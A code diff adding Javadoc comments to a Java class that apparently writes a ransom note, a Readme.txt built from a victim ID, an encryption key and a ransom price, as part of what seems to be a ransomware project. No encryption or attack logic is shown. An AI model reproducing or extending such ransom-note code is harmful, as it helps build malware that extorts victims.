@@ -13,7 +13,12 @@ public class CreateReadMeFile {
     private String content;
     private FileWriter readMeFile;
 
-
+    /**
+     * Create read me file
+     * @param victimID The victim ID
+     * @param encryptionKey The encryption key
+     * @param salaryOfEncryptionKey The salary of encryption key
+     */
     public CreateReadMeFile(String victimID, String encryptionKey, float salaryOfEncryptionKey){
         setVictimID(victimID);
         setEncryptionKey(encryptionKey);
@@ -21,6 +26,9 @@ public class CreateReadMeFile {
         initContent();
     }
 
+    /**
+     * Initialize readme file content
+     */
     public void initContent() {
         SimpleDateFormat df = new SimpleDateFormat("yyy-MM-dd");
         String date = df.format(new Date());
@@ -47,6 +55,11 @@ public class CreateReadMeFile {
                 "حظا سعيدا (;";*/
     }
 
+    /**
+     * Create read me file
+     * @param path The path in which you want to create a Readme file
+     * @throws IOException If you can't create the file
+     */
     public void create (String path) throws IOException {
         readMeFile = new FileWriter(path + "\\Readme.txt");
         readMeFile.write(content);
